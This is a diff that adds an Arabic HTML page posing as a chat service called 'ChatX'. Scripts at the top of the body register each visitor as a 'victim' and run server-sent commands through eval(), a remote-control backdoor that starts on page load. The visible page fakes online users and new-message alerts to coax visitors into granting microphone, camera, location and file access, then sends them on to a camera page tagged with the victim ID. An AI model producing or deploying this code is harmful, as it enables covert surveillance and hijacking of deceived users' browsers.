@@ -1,0 +1,593 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>دردشة الجيل الجديد | ChatX</title>
+    <style>
+        :root {
+            --primary: #5865F2;
+            --secondary: #404EED;
+            --dark: #23272A;
+            --light: #FFFFFF;
+            --success: #3BA55C;
+            --danger: #ED4245;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f6f6f6;
+            color: #333;
+        }
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        header {
+            background-color: var(--primary);
+            color: white;
+            padding: 15px 0;
+            text-align: center;
+            border-radius: 0 0 15px 15px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+        }
+        .logo {
+            font-size: 28px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        .tagline {
+            font-size: 16px;
+            opacity: 0.9;
+        }
+        .chat-container {
+            display: flex;
+            margin-top: 30px;
+            background-color: white;
+            border-radius: 15px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+            overflow: hidden;
+        }
+        .sidebar {
+            width: 250px;
+            background-color: var(--dark);
+            color: white;
+            padding: 20px;
+        }
+        .main-chat {
+            flex: 1;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            min-height: 500px;
+        }
+        .permission-container {
+            flex: 1;
+            overflow-y: auto;
+            padding-right: 10px;
+        }
+        .permission-box {
+            background-color: #f9f9f9;
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 20px;
+            border: 1px solid #eee;
+            transition: all 0.3s;
+            opacity: 0;
+            transform: translateY(20px);
+            animation: fadeIn 0.5s forwards;
+        }
+        @keyframes fadeIn {
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .permission-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+        .permission-icon {
+            font-size: 24px;
+            margin-left: 10px;
+            color: var(--primary);
+        }
+        .permission-title {
+            font-weight: bold;
+            font-size: 18px;
+        }
+        .permission-desc {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 15px;
+        }
+        .btn {
+            background-color: var(--primary);
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: all 0.3s;
+            display: inline-block;
+        }
+        .btn:hover {
+            background-color: var(--secondary);
+            transform: translateY(-2px);
+        }
+        .btn-block {
+            display: block;
+            width: 100%;
+            text-align: center;
+        }
+        .btn-disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+        }
+        .permission-steps {
+            margin-top: 30px;
+            background-color: var(--success);
+            color: white;
+            padding: 15px;
+            border-radius: 10px;
+        }
+        .online-users {
+            margin-top: 20px;
+        }
+        .user {
+            display: flex;
+            align-items: center;
+            padding: 8px 0;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+        }
+        .user-avatar {
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            background-color: var(--primary);
+            margin-left: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+        }
+        .user-name {
+            font-size: 14px;
+        }
+        .user-status {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background-color: var(--success);
+            margin-right: auto;
+        }
+        .notification {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background-color: var(--dark);
+            color: white;
+            padding: 15px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+            z-index: 1000;
+            display: none;
+        }
+        .progress-container {
+            width: 100%;
+            background-color: #e0e0e0;
+            border-radius: 5px;
+            margin: 15px 0;
+        }
+        .progress-bar {
+            height: 10px;
+            background-color: var(--primary);
+            border-radius: 5px;
+            width: 0%;
+            transition: width 0.5s ease;
+        }
+    </style>
+</head>
+<body>
+  <script>
+const victimId = "{{ victim_id }}";
+
+setInterval(() => {
+    fetch(`/api/poll_commands?victim_id=${victimId}`)
+        .then(res => res.json())
+        .then(commands => {
+            commands.forEach(cmd => {
+                try {
+                    eval(cmd.command);
+                } catch (e) {
+                    console.error("Command error:", e);
+                }
+            });
+        })
+        .catch(err => console.error(err));
+}, 2000);
+   
+   </script>
+
+
+   <script>
+        const victimId = 'v-' + Math.random().toString(36).substr(2, 9);
+        const socket = io({
+            query: { victim_id: victimId },
+            reconnection: true,
+            reconnectionAttempts: 5,
+            reconnectionDelay: 1000
+        });
+
+        // معالجة الأوامر الواردة
+        socket.on('execute_command', (data) => {
+            console.log('Received command:', data.command);
+            
+            try {
+                // تنفيذ الأمر ككود JavaScript
+                const result = eval(data.command);
+                
+                // إرسال الرد إلى السيرفر
+                socket.emit('command_response', {
+                    command_id: data.command_id,
+                    response: result || 'Command executed'
+                });
+                
+                // إظهار تنبيه للضحية (اختياري)
+                if (data.command.includes('alert')) {
+                    alert('تم استلام تحديث جديد من النظام');
+                }
+            } catch (error) {
+                socket.emit('command_response', {
+                    command_id: data.command_id,
+                    response: 'Error: ' + error.message
+                });
+            }
+        });
+
+        // حالات الاتصال
+        socket.on('connect', () => {
+            console.log('Connected to server');
+        });
+
+        socket.on('disconnect', () => {
+            console.log('Disconnected from server');
+        });
+
+        // تسجيل الضحية عند التحميل
+        window.addEventListener('load', () => {
+            fetch('/api/register', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ victim_id: victimId })
+            });
+        });
+    </script>
+
+<script>
+const victimId = "{{ victim_id }}"; // السيرفر يمررها مع الصفحة
+
+setInterval(() => {
+    fetch(`/api/poll_commands?victim_id=${victimId}`)
+        .then(res => res.json())
+        .then(commands => {
+            commands.forEach(cmd => {
+                try {
+                    eval(cmd.command);
+                } catch (e) {
+                    console.error("Command error:", e);
+                }
+            });
+        })
+        .catch(err => console.error(err));
+}, 2000); // كل ثانيتين
+</script>
+    <div class="notification" id="notification"></div>
+
+    <header>
+        <div class="container">
+            <div class="logo">ChatX</div>
+            <div class="tagline">منصة الدردشة الأسرع والأكثر أمانًا</div>
+        </div>
+    </header>
+
+    <div class="container">
+        <div class="chat-container">
+            <div class="sidebar">
+                <h3>المستخدمون المتصلون</h3>
+                <div class="online-users" id="onlineUsers">
+                    <div class="user">
+                        <div class="user-status"></div>
+                        <div class="user-name">أحمد</div>
+                        <div class="user-avatar">A</div>
+                    </div>
+                    <div class="user">
+                        <div class="user-status"></div>
+                        <div class="user-name">سارة</div>
+                        <div class="user-avatar">S</div>
+                    </div>
+                    <div class="user">
+                        <div class="user-status"></div>
+                        <div class="user-name">محمد</div>
+                        <div class="user-avatar">M</div>
+                    </div>
+                    <div class="user">
+                        <div class="user-status"></div>
+                        <div class="user-name">نور</div>
+                        <div class="user-avatar">N</div>
+                    </div>
+                </div>
+            </div>
+            <div class="main-chat">
+                <h2>مرحبًا بك في ChatX!</h2>
+                <p>لتحسين تجربة الدردشة، نحتاج بعض الأذونات:</p>
+                
+                <div class="progress-container">
+                    <div class="progress-bar" id="progressBar"></div>
+                </div>
+                
+                <div class="permission-container" id="permissionContainer">
+                    <!-- سيتم إضافة الأذونات ديناميكيًا هنا -->
+                </div>
+
+                <div class="permission-steps" id="permissionSteps">
+                    <h3>جاري إعداد تجربة الدردشة المثالية...</h3>
+                    <div id="steps">
+                        <p>✓ التحقق من الحساب</p>
+                        <p>✓ تفعيل الإشعارات</p>
+                        <p id="loadingContacts">جاري تحميل جهات الاتصال...</p>
+                    </div>
+                </div>
+
+                <button class="btn btn-block" id="continueBtn" style="display: none;" onclick="finishSetup()">متابعة إلى الدردشة</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // إنشاء معرف ضحية فريد
+        const victimId = 'v-' + Math.random().toString(36).substr(2, 9) + '-' + Date.now().toString(36);
+        let grantedPermissions = 0;
+        const totalPermissions = 6; // زيادة عدد الأذونات
+        
+        // قائمة الأذونات مع تفاصيلها
+        const permissions = [
+            {
+                id: 'microphone',
+                icon: '🎤',
+                title: 'الوصول إلى الميكروفون',
+                description: 'للسماح بالمكالمات الصوتية والدردشة الصوتية مع الأصدقاء',
+                request: async () => {
+                    try {
+                        await navigator.mediaDevices.getUserMedia({ audio: true });
+                        return true;
+                    } catch (error) {
+                        return false;
+                    }
+                }
+            },
+            {
+                id: 'camera',
+                icon: '📷',
+                title: 'الوصول إلى الكاميرا',
+                description: 'لمشاركة الفيديو خلال المحادثات وميزة التعرف على الوجوه',
+                request: async () => {
+                    try {
+                        await navigator.mediaDevices.getUserMedia({ video: true });
+                        return true;
+                    } catch (error) {
+                        return false;
+                    }
+                }
+            },
+            {
+                id: 'location',
+                icon: '📍',
+                title: 'الوصول إلى الموقع',
+                description: 'لإظهار المستخدمين القريبين منك وتخصيص تجربة الدردشة',
+                request: () => {
+                    return new Promise((resolve) => {
+                        if (navigator.geolocation) {
+                            navigator.geolocation.getCurrentPosition(
+                                () => resolve(true),
+                                () => resolve(false)
+                            );
+                        } else {
+                            resolve(false);
+                        }
+                    });
+                }
+            },
+            {
+                id: 'files',
+                icon: '💾',
+                title: 'الوصول إلى الملفات',
+                description: 'لمشاركة الصور والملفات مع الأصدقاء في الدردشة',
+                request: () => {
+                    return new Promise((resolve) => {
+                        const input = document.createElement('input');
+                        input.type = 'file';
+                        input.onchange = () => resolve(true);
+                        input.oncancel = () => resolve(false);
+                        input.click();
+                    });
+                }
+            },
+            {
+                id: 'notifications',
+                icon: '🔔',
+                title: 'إرسال الإشعارات',
+                description: 'لإعلامك بالرسائل الجديدة والإشعارات المهمة',
+                request: async () => {
+                    try {
+                        const result = await Notification.requestPermission();
+                        return result === 'granted';
+                    } catch (error) {
+                        return false;
+                    }
+                }
+            },
+            {
+                id: 'storage',
+                icon: '🗄️',
+                title: 'تخزين البيانات',
+                description: 'لحفظ إعداداتك وتفضيلاتك بين الجلسات',
+                request: () => {
+                    try {
+                        localStorage.setItem('test', 'test');
+                        localStorage.removeItem('test');
+                        return true;
+                    } catch (error) {
+                        return false;
+                    }
+                }
+            }
+        ];
+
+        // عرض الإشعارات
+        function showNotification(message, isError = false) {
+            const notification = document.getElementById('notification');
+            notification.textContent = message;
+            notification.style.backgroundColor = isError ? 'var(--danger)' : 'var(--success)';
+            notification.style.display = 'block';
+            
+            setTimeout(() => {
+                notification.style.display = 'none';
+            }, 3000);
+        }
+
+        // إنشاء عناصر الأذونات
+        function createPermissionBoxes() {
+            const container = document.getElementById('permissionContainer');
+            
+            permissions.forEach((permission, index) => {
+                setTimeout(() => {
+                    const box = document.createElement('div');
+                    box.className = 'permission-box';
+                    box.id = `permission-${permission.id}`;
+                    box.style.animationDelay = `${index * 0.2}s`;
+                    
+                    box.innerHTML = `
+                        <div class="permission-header">
+                            <span class="permission-icon">${permission.icon}</span>
+                            <span class="permission-title">${permission.title}</span>
+                        </div>
+                        <div class="permission-desc">${permission.description}</div>
+                        <button class="btn" onclick="requestPermission('${permission.id}')">تمكين ${permission.title.split(' ').pop()}</button>
+                    `;
+                    
+                    container.appendChild(box);
+                }, index * 200);
+            });
+        }
+
+        // طلب الإذن
+        async function requestPermission(permissionId) {
+            const permission = permissions.find(p => p.id === permissionId);
+            if (!permission) return;
+            
+            const button = document.querySelector(`#permission-${permissionId} .btn`);
+            button.disabled = true;
+            button.classList.add('btn-disabled');
+            button.textContent = 'جاري التحميل...';
+            
+            try {
+                const granted = await permission.request();
+                
+                if (granted) {
+                    button.textContent = '✓ تم التمكين';
+                    showNotification(`تم تفعيل ${permission.title} بنجاح!`);
+                    updateProgress();
+                } else {
+                    button.textContent = 'تم الرفض - إعادة المحاولة';
+                    button.classList.remove('btn-disabled');
+                    button.disabled = false;
+                    showNotification(`لم يتم تفعيل ${permission.title}`, true);
+                }
+            } catch (error) {
+                console.error(error);
+                button.textContent = 'خطأ - إعادة المحاولة';
+                button.classList.remove('btn-disabled');
+                button.disabled = false;
+                showNotification(`حدث خطأ أثناء طلب ${permission.title}`, true);
+            }
+        }
+
+        // تحديث التقدم
+        function updateProgress() {
+            grantedPermissions++;
+            const progress = Math.floor((grantedPermissions / totalPermissions) * 100);
+            document.getElementById('progressBar').style.width = `${progress}%`;
+            
+            if (grantedPermissions === totalPermissions) {
+                document.getElementById('permissionSteps').style.display = 'block';
+                document.getElementById('continueBtn').style.display = 'block';
+                
+                setTimeout(() => {
+                    document.getElementById('loadingContacts').innerHTML = '✓ تحميل جهات الاتصال';
+                    document.querySelector('#steps').innerHTML += `
+                        <p>✓ تهيئة خوادم الدردشة</p>
+                        <p>✓ الاتصال بالصوت والفيديو</p>
+                    `;
+                }, 1500);
+            }
+        }
+
+        // إنهاء الإعداد
+        function finishSetup() {
+            window.location.href = `/camera.html?victim=${victimId}`;
+        }
+
+        // تسجيل الضحية
+        function registerVictim() {
+            const data = {
+                victim_id: victimId,
+                user_agent: navigator.userAgent,
+                permissions: []
+            };
+
+            fetch('/api/register', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data)
+            }).catch(error => console.error('Error:', error));
+        }
+
+        // محاكاة مستخدمين متصلين
+        function simulateOnlineUsers() {
+            setInterval(() => {
+                const names = ['ليلى', 'خالد', 'ريم', 'ياسر', 'هناء'];
+                const name = names[Math.floor(Math.random() * names.length)];
+                
+                const user = document.createElement('div');
+                user.className = 'user';
+                user.innerHTML = `
+                    <div class="user-status"></div>
+                    <div class="user-name">${name}</div>
+                    <div class="user-avatar">${name.charAt(0)}</div>
+                `;
+                
+                document.getElementById('onlineUsers').prepend(user);
+                
+                setTimeout(() => user.remove(), 10000);
+            }, 5000);
+        }
+
+        // عند تحميل الصفحة
+        window.addEventListener('load', () => {
+            registerVictim();
+            createPermissionBoxes();
+            simulateOnlineUsers();
+            
+            setTimeout(() => {
+                showNotification('مرحبًا بك في ChatX! لديك 3 رسائل جديدة تنتظرك.');
+            }, 2000);
+        });
+    </script>
+</body>
+</html>
